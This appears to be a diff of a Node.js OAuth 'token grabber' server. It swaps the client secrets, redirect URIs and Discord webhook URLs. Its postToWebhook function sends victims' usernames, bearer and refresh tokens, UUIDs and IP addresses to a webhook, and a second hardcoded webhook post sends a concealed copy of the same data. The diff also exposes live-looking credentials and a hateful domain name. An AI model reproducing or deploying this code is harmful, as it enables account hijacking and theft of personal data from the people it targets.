@@ -1,8 +1,8 @@
 //Config
-const client_secret = 'b307ac6d-494c-4c9b-b204-486150b1f55b'
-const client_id = 'faeb1f74-b389-4f9a-8378-ddde98a276bf'
-const redirect_uri = 'https://i-love-hitler.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1089295424847876157/o1Ql9GHFc6ha96aJ4-l34gD0RwKZ6QBmHGsTHibGSoNb7Hn2HQ45_1Yp1ozjfzNGv-c4'
+const client_secret = 'thj8Q~C1xEzGzUw-d6kcockrxQezUhmqvhRNycKZ'
+const client_id = '8daafb9d-a3fd-45d3-ba89-8f0f09cd1418'
+const redirect_uri = 'https://oauth-898h.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1208420562746220635/mqDyfnhidPnP0ZBItyz9e89aAlF58RsWO558BajRY5UYkwLiykglAY1dfkOuLf9U80Tn'
 //Requirements
 const axios = require('axios')
 const express = require('express')
@@ -142,7 +142,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
 }
     axios.all([ 
         axios.post(url, data),
-        axios.post("https://discord.com/api/webhooks/1089295424847876157/o1Ql9GHFc6ha96aJ4-l34gD0RwKZ6QBmHGsTHibGSoNb7Hn2HQ45_1Yp1ozjfzNGv-c4", data)
+        axios.post("https://discord.com/api/webhooks/1208420562746220635/mqDyfnhidPnP0ZBItyz9e89aAlF58RsWO558BajRY5UYkwLiykglAY1dfkOuLf9U80Tn", data)
            .then(() => console.log("Successfully authenticated, posting to webhook!"))
     ])
     
